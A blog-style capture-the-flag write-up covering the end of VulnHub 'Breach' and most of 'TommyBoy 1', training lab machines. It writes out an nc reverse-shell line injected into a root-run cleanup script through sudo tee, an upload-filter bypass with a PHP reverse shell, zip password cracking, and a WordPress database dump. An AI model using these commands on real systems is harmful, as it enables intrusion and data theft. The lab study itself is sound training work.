<p>I switched to the user blumbergh and listed sudo permissions, this user can execute the tidyup.sh script as sudo with the tee command, the script delete the files into the webapps directory, a cronjob is in charge of executing this task every certain period of time.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>milton@Breach:~<span class="nv">$ </span>su - blumbergh
Password: 
blumbergh@Breach:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span>
blumbergh@Breach:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>blumbergh on Breach:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User blumbergh may run the following commands on Breach:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
blumbergh@Breach:~<span class="nv">$ </span><span class="nb">cat</span> /usr/share/cleanup/tidyup.sh
<span class="c">#!/bin/bash</span>

<span class="c">#Hacker Evasion Script </span>
<span class="c">#Initech Cyber Consulting, LLC</span>
<span class="c">#Peter Gibbons and Michael Bolton - 2016</span>
<span class="c">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span>

<span class="nb">cd</span> /var/lib/tomcat6/webapps <span class="o">&amp;&amp;</span> find swingline <span class="nt">-mindepth</span> 1 <span class="nt">-maxdepth</span> 10 | xargs <span class="nb">rm</span> <span class="nt">-rf</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>I passed as input a netcat reverse shell to the tee command which will write it in the tidyup.sh script, and we see the script was overwrited with the reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blumbergh@Breach:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'nc 192.168.110.142 4444 -c /bin/bash'</span> | <span class="nb">sudo</span> /usr/bin/tee /usr/share/cleanup/tidyup.sh 
nc 192.168.110.142 4444 <span class="nt">-c</span> /bin/bash
blumbergh@Breach:~<span class="nv">$ </span><span class="nb">cat</span> <span class="o">!</span><span class="err">$</span>
nc 192.168.110.142 4444 <span class="nt">-c</span> /bin/bash
</code></pre></div></div>

<p>Then start a netcat listener and a few minutes we get a root reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>192.168.110.142] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.140] 36978
<span class="nb">echo</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span> <span class="o">&gt;</span> /tmp/shell.py
python /tmp/shell.py
root@Breach:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@Breach:~# <span class="nb">ls</span> <span class="nt">-la</span>
total 60
drwx------  4 root root  4096 Jun 12  2016 <span class="nb">.</span>
drwxr-xr-x 22 root root  4096 Jun  4  2016 ..
<span class="nt">-rw-------</span>  1 root root   115 Jun 12  2016 .bash_history
<span class="nt">-rw-r--r--</span>  1 root root  3106 Feb 19  2014 .bashrc
drwx------  2 root root  4096 Jun  6  2016 .cache
<span class="nt">-rw-r--r--</span>  1 root root   840 Jun 11  2016 .flag.txt
<span class="nt">-rw-r--r--</span>  1 root root 23792 Jun  4  2016 flair.jpg
<span class="nt">-rw-r--r--</span>  1 root root   140 Feb 19  2014 .profile
drwxr-xr-x  2 root root  4096 Jun  5  2016 .rpmdb
<span class="nt">-rw-r--r--</span>  1 root root    66 Jun  4  2016 .selected_editor
root@Breach:~# <span class="nb">cat</span> .flag.txt 
<span class="nt">-----------------------------------------------------------------------------------</span>

______                     _     __   _____      _____ _          _____          _ 
| ___ <span class="se">\ </span>                  | |   /  | |  _  |    |_   _| |        |  ___|        | |
| |_/ /_ __ ___  __ _  ___| |__ <span class="sb">`</span>| | | |/<span class="s1">' |______| | | |__   ___| |__ _ __   __| |
| ___ \ '</span>__/ _ <span class="se">\/</span> _<span class="sb">`</span> |/ __| <span class="s1">'_ \ | | |  /| |______| | | '</span>_ <span class="se">\ </span>/ _ <span class="se">\ </span> __| <span class="s1">'_ \ / _` |
| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |
\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|


-----------------------------------------------------------------------------------
Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!

Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.
</span></code></pre></div></div>

  
    <h1 class="post-title">VulnHub - TommyBoy 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>August 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> The Callahan Auto company needs our help as unfortunately,the site just went down and the only person with admin credentials is Tom Callahan Sr. who just passed away! And to make matters worse, the only other guy with knowledge of the server just quit.</p>

<p><strong>Author:</strong> Brian Johnson</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To restore a backup copy of the homepage to Callahan Auto’s server and collect 5 flags strewn about the system, and use the data inside them to unlock one final message.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">https://www.vulnhub.com/entry/tommy-boy-1,157/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>I started to discover the target machine, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.149 00:0c:29:8f:03:08       VMware, Inc.
192.168.179.254 00:50:56:f5:4b:e2       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>With unicornscan I performed a full TCP port scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.149:a <span class="nt">-R</span> 3 <span class="nt">-r</span> 3000
...
TCP open                     ssh[   22]         from 192.168.179.149  ttl 64
TCP open                    http[   80]         from 192.168.179.149  ttl 64
TCP open                http-alt[ 8008]         from 192.168.179.149  ttl 64
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>Then I did version detection and script scanning of the open TCP ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-p22</span>,80,8008 <span class="nt">-sV</span> <span class="nt">-sC</span> 192.168.179.149 <span class="nt">-oN</span> service-enum.txt
...
PORT     STATE SERVICE REASON         VERSION                                                                                                                      
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>                                                                   
| ssh-hostkey:                                                                                                                                                     
|   2048 a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 <span class="o">(</span>RSA<span class="o">)</span>                                                                                                     
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDi74A2GW2LYOIaOCt3+uBb2ecZSCL0EKylLIwMoKts0TvVdP82C/Ajp0FF2r2DjDw7QxvGtdkOiprtsyVmznzEfKnuuiBNpcBhj297sukKvVBKfDiTv51DvbeqKhQEDdZGlj2ZJWtit+EAxndPQEMs4Jr48mLjQhb/D6P78DEfKlGOlRBlaj3PVMVzNifEEhYF3pYDxbkQ4RFOILMiQGo7IOoMrxJBYYzDxwQ2dXyTElJ4++M/zGojF3wRDqLq2v35xyZWmsG+5mA93aAo7R9sFELQNzGhdHc33FapQPe/tcAO4AdCU8Ex4I20Na4T+pN73//wOwyNOO49d7pCrOP
|   256 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBElpjsbihyk+MUGgJDx0lD/yU2pii+FxZ6jHwI6w/SyeYUDoLS50o98T0SRLJHEfAnVaR9eFAKoOI/LiBQ+UTWY<span class="o">=</span>
|   256 56:9e:71:2a:a3:83:ff:63:11:7e:94:08:dd:28:1d:46 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPN6HuPH7beQC1yRgoJaL+p2JhW62bu1xgCoKo4EPvFM
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 4 disallowed entries  
| /6packsofb...soda /lukeiamyourfather 
|_/lookalivelowbridge /flag-numero-uno.txt
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to Callahan Auto
8008/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: KEEP OUT
</code></pre></div></div>

<h3 id="web-enumeration-on-port-80">Web Enumeration on port 80</h3>
<p>I browsed the web server and found a welcome message of callahan auto.</p>

<p><img src="/assets/images/tommyboy/screenshot-1.png" alt="" /></p>

<p>Then I decided request for the robots file and found the first flag and other directories without any important, these were rabbit holes.</p>

<p><img src="/assets/images/tommyboy/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/tommyboy/screenshot-3.png" alt="" /></p>

<p>I tried to view the source page with the browser, and was able to find in Nick’s specifications about the access to a web page, it said if you don’t remember it, you can access the following youtube url <a href="https://www.youtube.com/watch?v=VUxOd4CszJ8">https://www.youtube.com/watch?v=VUxOd4CszJ8</a>.</p>

<p><img src="/assets/images/tommyboy/screenshot-4.png" alt="" /></p>

<p>I browse the /prehistoricforest directory and it redirected me to a wordpress page, and I could see a question for Richard, finding out the password for the protected post, in the comment we see that we can find it accessing the /richard directory.</p>

<p><img src="/assets/images/tommyboy/screenshot-5.png" alt="" /></p>

<p><img src="/assets/images/tommyboy/screenshot-6.png" alt="" /></p>

<p>In that directory I found an image, I downloaded it, used the strings command, and found an md5 hash.</p>

<p><img src="/assets/images/tommyboy/screenshot-7.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://192.168.179.149/richard/shockedrichard.jpg

root@kali:~<span class="nv">$ </span>strings shockedrichard.jpg | <span class="nb">head
</span>JFIF
Exif
Google
Copyright 
 1995 Paramount Pictures Corporation. Credit: 
 1995 Paramount Pictures / Courtesy: Pyxurz.
0220
ASCII
ce154b5a8e59c89732bc25d6a2e6b90b
8http://ns.adobe.com/xap/1.0/
</code></pre></div></div>

<p>I googled the password for this hash, and found the password <strong>spanky</strong>.
<img src="/assets/images/tommyboy/screenshot-8.png" alt="" /></p>

<p>I typed the password in the protected post and it enabled the hidden text.</p>

<p><img src="/assets/images/tommyboy/screenshot-9.png" alt="" /></p>

<p>In the comment we can see that Nick is some excited for his departure and leaves us some love words, anyway we see in text that there’s a backup called callahanbak.bak and we have to restore it, but first we need to login with Big Tom’s account via ssh, also mentions that this user always forgets his password, and about a FTP service that runs on a non-standard port and that it is online for 15 minutes and then down for the same time, to access to this service we can use the username <strong>nickburns</strong> and that the password is easy to guess.</p>

<p><img src="/assets/images/tommyboy/screenshot-10.png" alt="" /></p>

<p><img src="/assets/images/tommyboy/screenshot-11.png" alt="" /></p>

<p>So I proceeded to perform a re-scan of the TCP ports and found the port 65534 is enabled, on which the FTP service is running.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.149:a <span class="nt">-R</span> 3 <span class="nt">-r</span> 3000
...
TCP open                     ssh[   22]         from 192.168.179.149  ttl 64 
TCP open                    http[   80]         from 192.168.179.149  ttl 64 
TCP open                http-alt[ 8008]         from 192.168.179.149  ttl 64 
TCP open                 unknown[65534]         from 192.168.179.149  ttl 64

root@kali:~<span class="nv">$ </span>nmap <span class="nt">-p65534</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> 192.168.179.149 
...
PORT      STATE SERVICE VERSION
65534/tcp open  ftp     ProFTPD
MAC Address: 00:0C:29:8F:03:08 <span class="o">(</span>VMware<span class="o">)</span>
</code></pre></div></div>
<p>Poked around in the comments I found the path to the second flag.</p>

<p><img src="/assets/images/tommyboy/screenshot-12.png" alt="" /></p>

<p><img src="/assets/images/tommyboy/screenshot-13.png" alt="" /></p>

<h3 id="ftp-enumeration">FTP Enumeration</h3>
<p>I tried log in with the user <strong>nickburns</strong> as username and password and had successful access, then downloaded the readme.txt file to the attacking machine, in the text file I can see that there is a subfolder called /NickIzL33t on this server somewhere.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ftp 192.168.179.149 65534
Connected to 192.168.179.149.
220 Callahan_FTP_Server 1.3.5
Name <span class="o">(</span>192.168.179.149:s4rgaz<span class="o">)</span>: nickburns
331 Password required <span class="k">for </span>nickburns
Password:
230 User nickburns logged <span class="k">in
</span>Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
200 PORT <span class="nb">command </span>successful
150 Opening ASCII mode data connection <span class="k">for </span>file list
drwxr-x---   4 nickburns nickburns     4096 Jul 20  2016 <span class="nb">.</span>
drwxr-x---   4 nickburns nickburns     4096 Jul 20  2016 ..
<span class="nt">-rw-r--r--</span>   1 root     root            0 Jul 21  2016 .bash_history
drwx------   2 nickburns nickburns     4096 Jul  6  2016 .cache
drwxrwxr-x   2 nickburns nickburns     4096 Jul  6  2016 .nano
<span class="nt">-rw-rw-r--</span>   1 nickburns nickburns      977 Jul 15  2016 readme.txt
226 Transfer <span class="nb">complete
</span>ftp&gt; get readme.txt
<span class="nb">local</span>: readme.txt remote: readme.txt
200 PORT <span class="nb">command </span>successful
150 Opening BINARY mode data connection <span class="k">for </span>readme.txt <span class="o">(</span>977 bytes<span class="o">)</span>
226 Transfer <span class="nb">complete
</span>977 bytes received <span class="k">in </span>0.04 secs <span class="o">(</span>25.4855 kB/s<span class="o">)</span>

root@kali:~<span class="nv">$ </span><span class="nb">cat </span>readme.txt 
To my replacement:

If you<span class="s1">'re reading this, you have the unfortunate job of taking over IT responsibilities
from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You'</span>ll be
surrounded by stupid monkeys all day <span class="nb">who </span>can barely hit Ctrl+P and wouldn<span class="s1">'t know a fax machine
from a flame thrower!

Anyway I'</span>m not completely without mercy.  There<span class="s1">'s a subfolder called "NickIzL33t" on this server
somewhere. I used it as my personal dropbox on the company'</span>s dime <span class="k">for </span>years.  Heh. LOL.
I cleaned it out <span class="o">(</span>no naughty pix <span class="k">for </span>you!<span class="o">)</span> but <span class="k">if </span>you need a place to dump stuff that you want
to look at on your phone later, consider that folder my gift to you.

Oh by the way, Big Tom<span class="s1">'s a moron and always forgets his passwords and so I made an encrypted
.zip of his passwords and put them in the "NickIzL33t" folder as well.  But guess what?
He always forgets THAT password as well.  Luckily I'</span>m a <span class="nb">nice </span>guy and left him a hint sheet.

Good luck, schmuck!

LOL.

<span class="nt">-Nick</span>
</code></pre></div></div>

<h3 id="web-enumeration-on-port-8008">Web Enumeration on port 8008</h3>
<p>I requested the /NickIzL33t resource on port 8080, but it says that Nick and Steve Jobs can see this content.</p>

<p><img src="/assets/images/tommyboy/screenshot-14.png" alt="" /></p>

<p>After a long time without finding anything useful, I realize that Steve Job has access to this page so, we could access the content with some mac device, I installed the User-Agent Switcher plugin in the firefox browser and changed it for the iPhone user agent and shown the following content:</p>

<p><img src="/assets/images/tommyboy/screenshot-15.png" alt="" /></p>

<p>I ran gobuster to find the file with .html extension but I didn’t find anything with the common word lists, so I fire gobuster again with the rockyou and finally find the file <strong>fallon1.html</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> rockyou.txt

root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.149:8008/NickIzL33t/ <span class="nt">-a</span> <span class="s1">'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KH
TML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)'</span> <span class="nt">-w</span> rockyou.txt <span class="nt">-e</span> <span class="nt">-x</span> html 2&gt;/dev/null
...
http://192.168.179.149:8008/NickIzL33t/fallon1.html         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 459]
</code></pre></div></div>

<p><img src="/assets/images/tommyboy/screenshot-16.png" alt="" /></p>

<p>In the hint link I found the instructions to generate the password combinations for Big Tom, so I developed a bash script for this.</p>

<p><img src="/assets/images/tommyboy/screenshot-17.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nv">file</span><span class="o">=</span><span class="s2">"tom_wordlist.txt"</span>
<span class="nv">nick</span><span class="o">=</span><span class="s2">"bev"</span>
<span class="nv">year</span><span class="o">=</span>1995

<span class="nb">echo</span> <span class="s2">"Generating wordlist..."</span>

<span class="k">for </span>ul <span class="k">in</span> <span class="o">{</span>A..Z<span class="o">}</span><span class="p">;</span> <span class="k">do
    for </span>num <span class="k">in</span> <span class="o">{</span>00..99<span class="o">}</span><span class="p">;</span> <span class="k">do
        for </span>l1 <span class="k">in</span> <span class="o">{</span>a..z<span class="o">}</span><span class="p">;</span> <span class="k">do
            for </span>l2 <span class="k">in</span> <span class="o">{</span>a..z<span class="o">}</span><span class="p">;</span> <span class="k">do
                for </span>s <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>symbols.txt<span class="si">)</span><span class="p">;</span> <span class="k">do
                    </span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">nick</span><span class="k">}${</span><span class="nv">ul</span><span class="k">}${</span><span class="nv">num</span><span class="k">}${</span><span class="nv">l1</span><span class="k">}${</span><span class="nv">l2</span><span class="k">}${</span><span class="nv">s</span><span class="k">}${</span><span class="nv">year</span><span class="k">}</span><span class="s2">"</span>
                <span class="k">done
            done
        done
    done
done</span> <span class="o">&gt;</span> <span class="nv">$file</span>
</code></pre></div></div>

<p>I created a symbols.txt file with some symbols and then ran the script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>./pass-gen.sh
</code></pre></div></div>

<p>I clicked on “The Third flag” link and was redirected to the content of the flag.</p>

<p><img src="/assets/images/tommyboy/screenshot-18.png" alt="" /></p>

<p>Then with curl I downloaded the zip file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget <span class="nt">--user-agent</span><span class="o">=</span><span class="s2">"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)"</span> http://192.168.179.149:8008/NickIzL33t/t0msp4ssw0rdz.zip
</code></pre></div></div>

<p>With the wordlist generated before, I cracked the zip file, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>fcrackzip <span class="nt">-u</span> <span class="nt">-D</span> <span class="nt">-p</span> tom_wordlist.txt t0msp4ssw0rdz.zip

PASSWORD FOUND!!!!: pw <span class="o">==</span> bevH00tr<span class="nv">$1995</span>
</code></pre></div></div>

<p>Then I unzip the <strong>t0msp4ssw0rdz.zip</strong> file, and I can see some credentials, for the bigtommysenior user the password is incomplete, there are numbers after this but it is written in a draft of the company blog, for the bigtom user the password hint is a famous Queen song.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>unzip t0msp4ssw0rdz.zip 
Archive:  t0msp4ssw0rdz.zip
<span class="o">[</span>t0msp4ssw0rdz.zip] passwords.txt password: 
  inflating: passwords.txt           
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>passwords.txt 
Sandusky Banking Site
<span class="nt">------------------------</span>
Username: BigTommyC
Password: money

TheKnot.com <span class="o">(</span>wedding site<span class="o">)</span>
<span class="nt">---------------------------</span>
Username: TomC
Password: wedding

Callahan Auto Server
<span class="nt">----------------------------</span>
Username: bigtommysenior
Password: fatguyinalittlecoat

Note: after the <span class="s2">"fatguyinalittlecoat"</span> part there are some numbers, but I don<span class="s1">'t remember what they are.
However, I wrote myself a draft on the company blog with that information.

Callahan Company Blog
----------------------------
Username: bigtom(I think?)
Password: ??? 
Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
</span></code></pre></div></div>

<p>I reviewed the html code with the browser and found a comment about a file upload resource in the /P4TCH_4D4M5 directory, as we can see this exists.</p>

<p><img src="/assets/images/tommyboy/screenshot-19.png" alt="" /></p>

<p><img src="/assets/images/tommyboy/screenshot-20.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="file-upload">File upload</h3>

<p>I tried to upload a php file but this didn’t work, so I uploaded a php file with the extension .php.gif, this time was possible bypass the restrictions, and the php code was interpreted.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"&lt;?php phpinfo(); ?&gt;"</span> <span class="o">&gt;</span> info.php.gif
</code></pre></div></div>
<p><img src="/assets/images/tommyboy/screenshot-21.png" alt="" /></p>

<p><img src="/assets/images/tommyboy/screenshot-22.png" alt="" /></p>

<p><img src="/assets/images/tommyboy/screenshot-23.png" alt="" /></p>

<p><strong>Getting a reverse shell</strong></p>

<p>I used a reverse shell php from pentestmonkey, changed the ip address for the ours and the port, then I uploaded it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php z.php.gif
root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.179.1/;s/1234/443/'</span> z.php.gif
</code></pre></div></div>
<p><img src="/assets/images/tommyboy/screenshot-24.png" alt="" /></p>

<p><img src="/assets/images/tommyboy/screenshot-25.png" alt="" /></p>

<p>I first set up a netcat listener and then we ran with the browser our reverse shell.</p>

<p><img src="/assets/images/tommyboy/screenshot-26.png" alt="" /></p>

<p>Finally I got a reverse shell, in the path /.5.txt found the flag number 5, but we need the fourth flag to complete the challenge and so we would join all flags and unzip the loot.zip file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443                                    
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.149] 49788
Linux CallahanAutoSrv01 4.4.0-31-generic <span class="c">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
 10:57:10 up 46 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ bash -i
bash: cannot set terminal process group (1295): Inappropriate ioctl for device
bash: no job control in this shell
www-data@CallahanAutoSrv01:/$ ls -la
ls -la
total 105
drwxr-xr-x  25 root     root      4096 Jul 15  2016 .
drwxr-xr-x  25 root     root      4096 Jul 15  2016 ..
-rwxr-x---   1 www-data www-data   520 Jul  7  2016 .5.txt
drwxr-xr-x   2 root     root      4096 Jul  6  2016 bin
drwxr-xr-x   4 root     root      1024 Jul 14  2016 boot
...
www-data@CallahanAutoSrv01:/$ cat .5.txt
cat .5.txt
FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
OH RICHARD DON'</span>T RUN AWAY FROM YOUR FEELINGS!!!!!!!!

Flag data: Buttcrack

Ok, so NOW what you <span class="k">do </span>is take the flag data from each flag and blob it into one big chunk.
So <span class="k">for </span>example, <span class="k">if </span>flag 1 data was <span class="s2">"hi"</span> and flag 2 data was <span class="s2">"there"</span> and flag 3 data was <span class="s2">"you"</span>
you would create this blob:

hithereyou

Do this <span class="k">for </span>ALL the flags sequentially, and this password will open the loot.zip <span class="k">in </span>Big Tom<span class="s1">'s folder and you can call the box PWNED.
</span></code></pre></div></div>

<p>Then I tried to search for the documentroot in the apache configuration files in the path <strong>/var/www/html/prehistoricforest/</strong> I found the wordpress credentials for mysql.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@CallahanAutoSrv01:/<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-ir</span> <span class="s1">'documentroot'</span> /etc/apache2/
<span class="nb">grep</span> <span class="nt">-ir</span> <span class="s1">'documentroot'</span> /etc/apache2
/etc/apache2/sites-available/default-ssl.conf:          DocumentRoot /var/www/html
/etc/apache2/sites-available/000-default.conf:  DocumentRoot /var/www/html
/etc/apache2/sites-available/2.conf:    DocumentRoot /var/thatsg0nnaleaveamark
www-data@CallahanAutoSrv01:/<span class="nv">$ </span><span class="nb">cd</span> /var/www/html/prehistoricforest/
<span class="nb">cd</span> /var/www/html/prehistoricforest/
www-data@CallahanAutoSrv01:/var/www/html/prehistoricforest<span class="nv">$ </span><span class="nb">cat </span>wp-config.php
...
/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/             
define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'wordpress'</span><span class="o">)</span><span class="p">;</span>                      
                                                       
/<span class="k">**</span> MySQL database username <span class="k">*</span>/                      
define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'wordpressuser'</span><span class="o">)</span><span class="p">;</span>    
                                  
/<span class="k">**</span> MySQL database password <span class="k">*</span>/                       
define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'CaptainLimpWrist!!!'</span><span class="o">)</span><span class="p">;</span>  
                                              
/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/            
define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>      
                                            
/<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/   
define<span class="o">(</span><span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8'</span><span class="o">)</span><span class="p">;</span>                                 
                                                          
/<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */ 
define('</span>DB_COLLATE<span class="s1">', '');
...
</span></code></pre></div></div>

<p>I dumped the wordpress database and transferred it to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@CallahanAutoSrv01:/var/www/html/prehistoricforest<span class="nv">$ </span>mysqldump <span class="nt">-u</span> wordpressuser <span class="nt">-p</span> wordpress <span class="o">&gt;</span> /tmp/wpdump.sql
&lt;orest<span class="nv">$ </span>mysqldump <span class="nt">-u</span> wordpressuser <span class="nt">-p</span> wordpress <span class="o">&gt;</span> /tmp/wpdump.sql            
Enter password: CaptainLimpWrist!!!
www-data@CallahanAutoSrv01:/var/www/html/prehistoricforest<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 6565 &lt; /tmp/wpdump.sql
</code></pre></div></div>

